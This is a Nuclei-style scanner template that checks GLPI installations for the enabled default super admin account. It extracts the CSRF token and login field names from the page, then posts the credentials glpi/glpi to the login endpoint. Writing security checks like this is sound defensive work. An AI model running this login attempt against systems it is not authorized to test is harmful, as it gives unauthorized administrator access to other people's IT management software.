http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - hidden" name="_glpi_csrf_token" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: name
    part: body
    regex:
    - type="text" name="([0-9a-z]+)" id="login_name" required="required"
    type: regex
  - group: 1
    internal: true
    name: password
    part: body
    regex:
    - type="password" name="([0-9a-z]+)" id="login_password" required="required"
    type: regex
  matchers:
  - type: word
    words:
    - <title>GLPI - Standard Interface</title>
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    pass:
    - glpi
    user:
    - glpi
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /front/login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}


    {{name}}={{user}}&{{password}}={{pass}}&auth=local&submit=Submit&_glpi_csrf_token={{token}}

    '
id: glpi-default-login
info:
  author: andysvints
  classification:
    cwe-id: CWE-798
  description: GLPI default login credentials were discovered. GLPI is an ITSM software
    tool that helps you plan and manage IT changes. This template checks if a default
    super admin account (glpi/glpi) is enabled.
  metadata:
    max-request: 2
  name: GLPI Default Login
  reference:
  - https://glpi-project.org/
  severity: high
  tags: glpi,default-login,vuln
